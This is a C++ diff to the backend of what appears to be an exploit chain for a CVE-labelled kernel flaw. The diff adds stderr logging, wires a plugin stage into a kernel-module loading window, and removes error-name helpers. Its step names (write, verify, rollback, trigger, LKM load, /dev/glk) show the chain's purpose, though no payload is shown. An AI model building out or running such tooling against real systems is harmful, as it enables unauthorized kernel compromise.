@@ -7,6 +7,7 @@
 #include <cerrno>
 #include <chrono>
 #include <cstddef>
+#include <cstdio>
 #include <cstdint>
 #include <sys/types.h>
 #include <thread>
@@ -492,6 +493,19 @@ namespace ghostlock::backend::cve_2026_43284 {
     }
 
     namespace {
+        /* S4 logging batch: the chain hands over one already-bounded line per
+         * milestone (see diag_line.hpp). stderr keeps diagnostics separable from
+         * the human-readable stdout phases; the line ends with '
+'. Logging
+         * cannot fail the chain (void return, no error propagation). */
+        void real_chain_log(void *raw, const char *line) noexcept {
+            (void)raw;
+            if (line != nullptr) {
+                (void)std::fputs(line, stderr);
+                (void)std::fflush(stderr);
+            }
+        }
+
         /* The window callbacks receive the shared write.ctx pointer (&page); a
          * null member fails closed rather than reporting a fake window. */
         LkmWindowRuntime *lkm_window_from_page(void *raw) noexcept {
@@ -509,7 +523,18 @@ namespace ghostlock::backend::cve_2026_43284 {
 
     bool real_chain_run_lkm_window(void *raw) noexcept {
         LkmWindowRuntime *window = lkm_window_from_page(raw);
-        return window != nullptr && window->run();
+        if (window == nullptr) {
+            return false;
+        }
+        /* S4 P1 step 3a: hand the composition seam's POST_TERMINAL sink to the
+         * window for this run. The context owns the sink's lifetime (the
+         * composition root keeps the host alive across the chain); the window
+         * only borrows it, and attach is a plain assignment, so a null sink
+         * clears any stale attachment. */
+        const RealChainContext *ctx = context_from_page(raw);
+        window->attach_plugin_stage(
+                LkmWindowRuntime::PluginStageSink{ctx->plugin_dispatch, ctx->plugin_ctx});
+        return window->run();
     }
 
     void real_chain_close_lkm_channel(void *raw) noexcept {
@@ -557,6 +582,7 @@ namespace ghostlock::backend::cve_2026_43284 {
         ops.trigger = real_chain_trigger;
         ops.wait_result = real_chain_wait_result;
         ops.release = real_chain_release;
+        ops.log = &real_chain_log;
         /* Delta-2: bind the LKM residency window only when the composition root
          * supplied a runtime. A run with no runtime keeps the window unbound, so
          * the chain never opens /dev/glk by accident. */
@@ -576,37 +602,5 @@ namespace ghostlock::backend::cve_2026_43284 {
         return ops.run_ready();
     }
 
-    std::string_view chain_error_name(steps::ChainError error) noexcept {
-        switch (error) {
-            case steps::ChainError::None: return "None";
-            case steps::ChainError::NotAvailable: return "NotAvailable";
-            case steps::ChainError::NoCarrier: return "NoCarrier";
-            case steps::ChainError::CarrierUnusable: return "CarrierUnusable";
-            case steps::ChainError::InvalidPlan: return "InvalidPlan";
-            case steps::ChainError::TargetOutOfBounds: return "TargetOutOfBounds";
-            case steps::ChainError::PreImageMismatch: return "PreImageMismatch";
-            case steps::ChainError::WriteFailed: return "WriteFailed";
-            case steps::ChainError::ReadFailed: return "ReadFailed";
-            case steps::ChainError::VerifyMismatch: return "VerifyMismatch";
-            case steps::ChainError::RollbackFailed: return "RollbackFailed";
-            case steps::ChainError::CrashDumpFailed: return "CrashDumpFailed";
-            case steps::ChainError::HookFailed: return "HookFailed";
-            case steps::ChainError::TriggerFailed: return "TriggerFailed";
-            case steps::ChainError::LkmFailed: return "LkmFailed";
-            case steps::ChainError::WaitTimeout: return "WaitTimeout";
-            case steps::ChainError::CleanupFailed: return "CleanupFailed";
-            case steps::ChainError::LkmWindowFailed: return "LkmWindowFailed";
-        }
-        return "Unknown";
-    }
-
-    std::string_view chain_wait_name(steps::ChainWaitOutcome outcome) noexcept {
-        switch (outcome) {
-            case steps::ChainWaitOutcome::Pending: return "Pending";
-            case steps::ChainWaitOutcome::LkmLoaded: return "LkmLoaded";
-            case steps::ChainWaitOutcome::Failed: return "Failed";
-            case steps::ChainWaitOutcome::Timeout: return "Timeout";
-        }
-        return "Unknown";
-    }
+    /* chain_error_name() / chain_wait_name() live inline in steps/chain.hpp. */
 } // namespace ghostlock::backend::cve_2026_43284
